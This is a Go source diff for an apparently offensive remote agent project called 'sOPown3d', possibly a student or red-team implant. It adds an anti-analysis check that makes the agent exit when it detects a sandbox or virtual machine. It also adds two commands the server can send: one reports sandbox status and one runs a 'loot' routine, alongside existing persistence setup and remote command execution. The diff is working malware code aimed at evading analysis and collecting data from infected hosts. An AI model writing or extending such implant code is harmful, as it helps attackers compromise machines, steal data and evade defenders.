@@ -10,6 +10,7 @@ import (
 	"os"
 	"os/exec"
 	"runtime"
+	"sOPown3d/internal/agent/evasion"
 	"sOPown3d/internal/agent/persistence"
 	"strings"
 	"time"
@@ -39,6 +40,12 @@ func New(cfg Config) (*Agent, error) {
 	}
 
 	persistence.SetupPersistence()
+
+	// Check for sandbox/VM and exit if detected
+	if isSandbox, details := evasion.IsSandbox(); isSandbox {
+		log.Printf("⚠️ SANDBOX DETECTED - EXITING\n%s", details)
+		os.Exit(1)
+	}
 
 	return &Agent{
 		serverURL: cfg.ServerURL,
@@ -156,6 +163,17 @@ func executeCommand(cmd *shared.Command) string {
 			log.Println("  ✗ Non persistant")
 		}
 		return ""
+
+	case "sandbox":
+		log.Println("🔍 Checking for sandbox...")
+		isSandbox, details := evasion.IsSandbox()
+		if isSandbox {
+			return "⚠️ SANDBOX DETECTED\n" + details
+		}
+		return "✅ No sandbox detected\n" + details
+
+	case "loot":
+		return executeLootCommand()
 
 	default:
 		log.Printf("Commande inconnue: %s", cmd.Action)
